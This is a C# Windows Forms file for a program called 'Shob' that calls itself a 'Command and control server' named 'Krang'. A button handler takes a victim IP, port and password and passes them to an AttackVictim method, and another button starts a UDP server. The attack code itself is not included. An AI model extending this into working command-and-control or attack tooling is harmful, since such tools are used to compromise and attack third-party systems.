using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Shob
{
    public partial class Form1 : Form
    {
        Controller controller;
        UDPShob Udpshob;
        string ShobName = "Krang";


        public Form1()
        {
            InitializeComponent();
            Udpshob = new UDPShob();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            byte[] ip = new byte[4];
            ip = IPAddress.Parse(IpTextBox.Text).GetAddressBytes();
            byte[] port = new byte[2];
            int portnum = Int32.Parse(PortTextBox.Text);
            port = BitConverter.GetBytes(portnum);
            Udpshob.AttackVictim(ip, port,Encoding.UTF8.GetBytes(PassTextBox.Text));
        }
        
        internal void SetController(Controller mcontroller)
        {
            controller = mcontroller;
            Udpshob.SetController(mcontroller);
            UpdateMessageBox("Command and control server " + ShobName + " active");
        }

        internal void UpdateMessageBox(string msg)
        {
            MessageBoxText.Text += msg + "\r\n";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Udpshob.StartServer();
        }
    }
}
